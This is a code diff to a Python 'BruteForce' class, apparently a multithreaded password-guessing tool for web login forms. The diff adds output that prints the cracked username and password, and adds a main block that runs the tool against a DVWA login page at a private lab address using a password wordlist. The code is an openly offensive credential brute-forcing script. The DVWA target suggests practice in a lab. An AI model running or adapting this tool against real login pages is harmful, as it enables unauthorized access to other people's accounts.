@@ -7,7 +7,7 @@ class BruteForce:
     threads = []
 
     def __init__(self, url, username, passwords_list, username_field, password_field, submit_field_name,
-                 verification, verbose=None, threads=30):
+                 verification, threads, verbose=None):
         self.start = time.time()
         self.creds_found = False
         self.threads_num = threads
@@ -35,6 +35,11 @@ class BruteForce:
             print(colored(f'[+] Working On {number}\t\tPassword Found "{word}"', 'green'))
             self.end = time.time()
             print(f"[*] Total time - {self.end - self.start} seconds.")
+            time.sleep(3)
+            print("\n\n")
+            print(colored(f"Credentials for ", 'blue') + colored(f"{self.url}\n", 'green') +
+                  colored(f"Username: ", 'blue') + colored(f"{self.username}\n", 'green') +
+                  colored("Password: ", 'blue') + colored(f"{word}", 'green'))
 
     def brute_force(self):
         connection_check(self.url)
@@ -75,3 +80,8 @@ class BruteForce:
             self.end = time.time()
             print(f"[*] Total time - {self.end - self.start} seconds.")
         sys.exit()
+
+
+if __name__ == '__main__':
+    BruteForce('http://192.168.56.101/dvwa/login.php', 'admin', '../../../../../Wordlist/passwords.txt', 'username',
+               'password', 'Login', 'Login failed', 15).brute_force()
